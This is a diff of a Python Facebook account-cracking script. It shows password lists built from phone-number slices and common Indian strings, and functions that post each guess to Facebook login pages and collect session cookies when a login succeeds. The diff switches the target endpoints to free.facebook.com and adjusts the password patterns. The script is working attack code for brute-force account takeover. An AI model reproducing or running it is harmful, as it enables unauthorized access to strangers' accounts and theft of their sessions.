@@ -285,7 +285,7 @@ def rndm():
                 print(f'\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m\033[1;97m FIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE');linex()
                 for love in user:
                         ids = code + love 
-                        pasx = ['57273200',ids,ids[6:],ids[8:],ids[:8],ids[:6]]
+                        pasx = ['57273200',ids,ids[6:],ids[8:],ids[:2],ids[:4]]
                         pasa= [ids,ids[:8],ids[:6],ids[:7]]
                         pasb= ['57273200','57575751','59039200','57575752']
                         pasc= ['hindustan','india12345','india123']
@@ -860,7 +860,7 @@ def _M8_(ids,pasx):
                 loop+=1
         except:pass
 
-#━━━━━━━━━━━━━[MATHOD━MOBILE━M6]━━━━━━━━━━━━━━━━#
+#━━━━━━━━━━━━━[MATHOD━MOBILE━M9]━━━━━━━━━━━━━━━━#
 
 def _M9_(ids,pasx):
         global loop
@@ -871,7 +871,7 @@ def _M9_(ids,pasx):
         try:
                 for ps in pasx:
                         session = requests.Session()
-                        BLACKX = session.get('https://www.secure.facebook.com/pages/Login/103721483000692/').text
+                        BLACKX = session.get('https://free.facebook.com').text
                         apple ={'email': ids,
                         'cuid': '',
                         'guid': re.search('name="guid" value="(.*?)"', str(link)).group(1),
@@ -912,7 +912,7 @@ def _M9_(ids,pasx):
                         'upgrade-insecure-requests': '1',
                         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                         'viewport-width': '668',}
-                        lo = session.post('https://www.secure.facebook.com/login/device-based/regular/login/',data=apple,headers=tedy,).text
+                        lo = session.post('https://free.facebook.com/login/web/?&is_from_lara=1',data=apple,headers=tedy,).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
                                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -934,7 +934,7 @@ def _M9_(ids,pasx):
                 loop+=1
         except:pass
 
-#━━━━━━━━━━━━━[MATHOD━MOBILE━M6]━━━━━━━━━━━━━━━━#
+#━━━━━━━━━━━━━[MATHOD━MOBILE━M10]━━━━━━━━━━━━━━━━#
 
 def _M10_(ids,pasx):
         global loop
